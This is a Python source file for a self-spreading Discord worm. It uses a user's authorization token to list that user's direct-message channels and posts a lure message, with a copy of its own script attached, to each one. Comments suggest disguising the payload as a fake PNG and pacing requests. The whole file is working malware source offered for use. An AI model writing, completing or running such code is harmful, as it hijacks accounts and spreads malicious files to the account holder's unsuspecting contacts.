import requests
import time
import os
import sys

class FileNameTwice(Exception):
    def __init__(self, *args) -> None:
        super().__init__(*args)

class config:
    # TODO CHANGE THIS VARS IMPORTANT
    SELF_NAME = "MYNAME.py"
    MESSAGE = "Hello! My Message"
    RATE_LIMIT_DELAY = 3
    REQUEST_TIMEOUT = 5

    # This Vars you could change but dont have to
    USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0" # IDK why you would change this but you could
    DEBUG = False # This on True Wont send any Messages to the friends

    # Dont touch Anything under here
    DISCORD_API_BASE = "https://discordapp.com/api"
    DISCORD_API_V6 = DISCORD_API_BASE + "/v6"
    DISCORD_API_V9 = DISCORD_API_BASE + "/v9"
    USERS = "/users/@me"
    DISCORD_API_V6_USERS_ME = DISCORD_API_V6 + USERS
    RELATIONSHIPS = "/relationships"
    CHANNELS = "/channels"

    PATH = os.path.abspath(sys.argv[0])

class Worm:
    def __init__(self, token) -> None:
        self.discord_token = token

        self.files = {}

        self.headers = self._generate_headers()

        self._send_self()

    def _send_self(self) -> None:
        self.add_file(config.PATH, config.SELF_NAME)

    def _generate_headers(self) -> dict:
        headers = {
            "Authorization": self.discord_token,
            "Content-Type": "application/json",
            "User-Agent": config.USER_AGENT
            }
        
        return headers

    def _generate_payload(self) -> dict:
        payload = {
            "content": config.MESSAGE
            }
        
        return payload

    def add_file(self, path, name) -> None: # TODO # You should add Maby an fake PNG file to show the Target what you want to give him
        if not os.path.exists(path):
            raise FileNotFoundError
        
        if name in self.files.keys():
            raise FileNameTwice(f"{name} is set multiple times please set a other name")
        
        self.files[name] = open(path, 'rb')

    def get_friend_list(self) -> dict:
        return requests.get(config.DISCORD_API_V6_USERS_ME + config.RELATIONSHIPS, headers = self.headers) # You could implement here a Friend list processing
    
    def get_channel_ids(self) -> list:
        channels = requests.get(config.DISCORD_API_V6_USERS_ME + config.CHANNELS, headers = self.headers).json()

        ids = []

        for channel in channels:
            ids.append(channel['id'])

        return ids

    def spread(self):
        ids = self.get_channel_ids()

        if not config.DEBUG:
            for id in ids:
                if id != ids[0]: # Just to improve performance
                    time.sleep(3) 

                build_url = config.DISCORD_API_V9 + config.CHANNELS + f"/{id}/messages"

                response = requests.post(build_url, self._generate_payload(), headers = { "Authorization": self.discord_token } ,files=self.files, timeout = config.REQUEST_TIMEOUT) # This only Needed header part | You also can add response processing